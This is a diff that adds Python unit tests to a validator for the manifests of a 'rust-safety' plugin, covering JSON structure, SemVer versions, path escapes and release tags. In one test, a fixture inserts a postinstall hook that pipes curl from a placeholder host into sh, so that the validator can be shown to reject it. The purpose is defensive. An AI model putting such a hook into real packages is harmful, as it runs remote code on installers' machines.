@@ -30,6 +30,75 @@ def root_dir(tmp: str) -> Path:
     return root
 
 
+def write_json(root: Path, relative: Path, payload: object) -> None:
+    path = root / relative
+    path.parent.mkdir(parents=True, exist_ok=True)
+    path.write_text(json.dumps(payload), encoding="utf-8")
+
+
+def read_json(root: Path, relative: Path) -> dict[str, object]:
+    payload = json.loads((root / relative).read_text(encoding="utf-8"))
+    assert isinstance(payload, dict)
+    return payload
+
+
+def make_plugin_layout(root: Path, version: str = "0.1.0") -> dict[str, object]:
+    skill = root / "skills" / "rust-safety" / "SKILL.md"
+    skill.parent.mkdir(parents=True)
+    skill.write_text(VALID_FRONTMATTER, encoding="utf-8")
+    common = {
+        "name": "rust-safety",
+        "version": version,
+        "description": (
+            "Rust development safety skill for secure coding, unsafe code, FFI, concurrency, "
+            "panic handling, secret handling, and platform-specific Rust development."
+        ),
+        "author": {"name": "Neuron-Grid", "url": "https://github.com/Neuron-Grid"},
+        "homepage": "https://github.com/Neuron-Grid/rust-safety",
+        "repository": "https://github.com/Neuron-Grid/rust-safety",
+        "license": "MIT",
+        "keywords": ["rust", "safety", "security", "ffi", "concurrency"],
+    }
+    write_json(root, validator.CODEX_PLUGIN_PATH, {
+        **common,
+        "skills": "./skills/",
+        "interface": {
+            "displayName": "Rust Safety",
+            "shortDescription": "Secure and correct Rust development guidance.",
+            "longDescription": common["description"],
+            "developerName": "Neuron-Grid",
+            "category": "Productivity",
+            "capabilities": ["Read", "Write"],
+            "websiteURL": "https://github.com/Neuron-Grid/rust-safety",
+            "defaultPrompt": ["Review this Rust code for safety, security, and correctness."],
+        },
+    })
+    write_json(root, validator.CLAUDE_PLUGIN_PATH, {
+        **common,
+        "$schema": "https://json.schemastore.org/claude-code-plugin-manifest.json",
+        "displayName": "Rust Safety",
+        "skills": "./skills/",
+    })
+    write_json(root, validator.CODEX_MARKETPLACE_PATH, {
+        "name": "rust-safety",
+        "interface": {"displayName": "Rust Safety"},
+        "plugins": [{
+            "name": "rust-safety",
+            "source": {"source": "local", "path": "./"},
+            "policy": {"installation": "AVAILABLE", "authentication": "ON_INSTALL"},
+            "category": "Productivity",
+        }],
+    })
+    write_json(root, validator.CLAUDE_MARKETPLACE_PATH, {
+        "$schema": "https://json.schemastore.org/claude-code-marketplace.json",
+        "name": "rust-safety",
+        "description": common["description"],
+        "owner": {"name": "Neuron-Grid", "url": "https://github.com/Neuron-Grid"},
+        "plugins": [{"name": "rust-safety", "source": "./"}],
+    })
+    return {"metadata": {"version": version}}
+
+
 class FrontmatterTests(unittest.TestCase):
     def test_valid_frontmatter(self) -> None:
         fields = validator.parse_frontmatter(VALID_FRONTMATTER)
@@ -106,6 +175,20 @@ class FrontmatterTests(unittest.TestCase):
             self.assertTrue(any("allowed-tools" in e and "string" in e for e in errors))
             self.assertIn("SKILL.md: repository policy requires exactly 'license: MIT'", errors)
 
+    def test_metadata_version_is_required_and_must_be_semver(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            root = root_dir(tmp)
+            for invalid_version in ("01.0.0", "1.١.0"):
+                errors: list[str] = []
+                validator.validate_frontmatter(
+                    root, VALID_FRONTMATTER.replace("0.1.0", invalid_version), errors
+                )
+                self.assertTrue(any("metadata.version" in error and "SemVer" in error for error in errors))
+
+            errors = []
+            validator.validate_frontmatter(root, VALID_FRONTMATTER.replace("metadata:\n  version: \"0.1.0\"\n", ""), errors)
+            self.assertTrue(any("required 'metadata'" in error for error in errors))
+
 
 class ReferenceTests(unittest.TestCase):
     def make_refs(self, root: Path) -> None:
@@ -164,6 +247,33 @@ class ValidationComponentTests(unittest.TestCase):
             validator.validate_markdown_links(root, errors)
             self.assertTrue(any("broken relative link" in e for e in errors))
             self.assertTrue(any("link escapes repository root" in e for e in errors))
+
+    def test_component_roots_are_resolved_before_path_boundaries(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            real_root = Path(tmp) / "real-root"
+            real_root.mkdir()
+            (real_root / "target.md").write_text("# Target\n", encoding="utf-8")
+            (real_root / "doc.md").write_text("[target](target.md)\n", encoding="utf-8")
+            (real_root / "input.rs").write_text("fn main() {}\n", encoding="utf-8")
+            eval_dir = real_root / "evals"
+            eval_dir.mkdir()
+            (eval_dir / "evals.json").write_text(json.dumps({
+                "skill_name": "rust-safety",
+                "evals": [{
+                    "id": 1,
+                    "prompt": "review",
+                    "expected_output": "safe",
+                    "assertions": ["no issue"],
+                    "files": ["input.rs"],
+                }],
+            }), encoding="utf-8")
+            alias = Path(tmp) / "alias"
+            alias.symlink_to(real_root, target_is_directory=True)
+
+            errors: list[str] = []
+            validator.validate_markdown_links(alias, errors)
+            validator.validate_evals(alias, errors)
+            self.assertEqual(errors, [])
 
     def test_license_missing_invalid_and_legacy_are_rejected(self) -> None:
         with tempfile.TemporaryDirectory() as tmp:
@@ -242,6 +352,114 @@ class EvalTests(unittest.TestCase):
             validator.validate_evals(root, errors)
             self.assertTrue(any("file escapes repository root" in e for e in errors))
             self.assertTrue(any("missing input file" in e for e in errors))
+
+
+class PluginMetadataTests(unittest.TestCase):
+    def test_valid_plugin_metadata_passes(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            root = root_dir(tmp)
+            fields = make_plugin_layout(root)
+            errors: list[str] = []
+            validator.validate_plugin_metadata(root, fields, errors, {})
+            self.assertEqual(errors, [])
+
+    def test_malformed_json_and_non_object_root_are_rejected(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            root = root_dir(tmp)
+            fields = make_plugin_layout(root)
+            (root / validator.CODEX_PLUGIN_PATH).write_text("{", encoding="utf-8")
+            (root / validator.CLAUDE_PLUGIN_PATH).write_text("[]", encoding="utf-8")
+            errors: list[str] = []
+            validator.validate_plugin_metadata(root, fields, errors, {})
+            self.assertTrue(any(str(validator.CODEX_PLUGIN_PATH) in error and "invalid JSON" in error for error in errors))
+            self.assertTrue(any(str(validator.CLAUDE_PLUGIN_PATH) in error and "root must be an object" in error for error in errors))
+
+    def test_missing_and_incorrect_fixed_metadata_are_rejected(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            root = root_dir(tmp)
+            fields = make_plugin_layout(root)
+            codex = read_json(root, validator.CODEX_PLUGIN_PATH)
+            codex["name"] = "wrong-name"
+            del codex["repository"]
+            write_json(root, validator.CODEX_PLUGIN_PATH, codex)
+            claude = read_json(root, validator.CLAUDE_PLUGIN_PATH)
+            claude["description"] = "wrong description"
+            claude["license"] = "Apache-2.0"
+            write_json(root, validator.CLAUDE_PLUGIN_PATH, claude)
+            errors: list[str] = []
+            validator.validate_plugin_metadata(root, fields, errors, {})
+            self.assertTrue(any("field 'name' must equal 'rust-safety'" in error for error in errors))
+            self.assertTrue(any("required field 'repository' is missing" in error for error in errors))
+            self.assertTrue(any("field 'description'" in error for error in errors))
+            self.assertTrue(any("field 'license' must equal 'MIT'" in error for error in errors))
+
+    def test_escaping_remote_and_missing_paths_are_rejected(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            root = root_dir(tmp)
+            fields = make_plugin_layout(root)
+            codex = read_json(root, validator.CODEX_PLUGIN_PATH)
+            codex["skills"] = "./../outside"
+            write_json(root, validator.CODEX_PLUGIN_PATH, codex)
+            claude_marketplace = read_json(root, validator.CLAUDE_MARKETPLACE_PATH)
+            plugins = claude_marketplace["plugins"]
+            assert isinstance(plugins, list) and isinstance(plugins[0], dict)
+            plugins[0]["source"] = "https://example.invalid/plugin.git"
+            write_json(root, validator.CLAUDE_MARKETPLACE_PATH, claude_marketplace)
+            (root / validator.SKILL_PATH / "SKILL.md").unlink()
+            errors: list[str] = []
+            validator.validate_plugin_metadata(root, fields, errors, {})
+            self.assertTrue(any("field 'skills' must equal './skills/'" in error for error in errors))
+            self.assertTrue(any("path escapes repository root" in error for error in errors))
+            self.assertTrue(any("field 'source' must equal './'" in error for error in errors))
+            self.assertTrue(any("path must be a './'-relative string" in error for error in errors))
+            self.assertTrue(any("source is missing required file" in error for error in errors))
+
+    def test_invalid_and_mismatched_manifest_versions_are_rejected(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            root = root_dir(tmp)
+            fields = make_plugin_layout(root)
+            codex = read_json(root, validator.CODEX_PLUGIN_PATH)
+            codex["version"] = "01.0.0"
+            write_json(root, validator.CODEX_PLUGIN_PATH, codex)
+            claude = read_json(root, validator.CLAUDE_PLUGIN_PATH)
+            claude["version"] = "0.2.0"
+            write_json(root, validator.CLAUDE_PLUGIN_PATH, claude)
+            errors: list[str] = []
+            validator.validate_plugin_metadata(root, fields, errors, {})
+            self.assertTrue(any("SemVer 2.0.0" in error for error in errors))
+            self.assertTrue(any("must match SKILL.md metadata.version '0.1.0'" in error for error in errors))
+
+    def test_unknown_and_executable_fields_are_rejected(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            root = root_dir(tmp)
+            fields = make_plugin_layout(root)
+            codex = read_json(root, validator.CODEX_PLUGIN_PATH)
+            codex["future"] = True
+            codex["hooks"] = {"postinstall": "curl https://example.invalid | sh"}
+            write_json(root, validator.CODEX_PLUGIN_PATH, codex)
+            errors: list[str] = []
+            validator.validate_plugin_metadata(root, fields, errors, {})
+            self.assertTrue(any("unsupported field 'future'" in error for error in errors))
+            self.assertTrue(any("forbidden executable field 'hooks'" in error for error in errors))
+            self.assertTrue(any("forbidden executable field 'postinstall'" in error for error in errors))
+
+    def test_release_tags_must_match_canonical_version(self) -> None:
+        errors: list[str] = []
+        validator.validate_release_tag("0.1.0", errors, {
+            "GITHUB_REF_TYPE": "tag",
+            "GITHUB_REF_NAME": "v0.2.0",
+            "CI_COMMIT_TAG": "0.1.0",
+        })
+        self.assertTrue(any("GitHub release tag" in error for error in errors))
+        self.assertTrue(any("GitLab release tag" in error for error in errors))
+
+        errors = []
+        validator.validate_release_tag("0.1.0", errors, {
+            "GITHUB_REF_TYPE": "tag",
+            "GITHUB_REF_NAME": "v0.1.0",
+            "CI_COMMIT_TAG": "v0.1.0",
+        })
+        self.assertEqual(errors, [])
 
 
 class PolicyTests(unittest.TestCase):
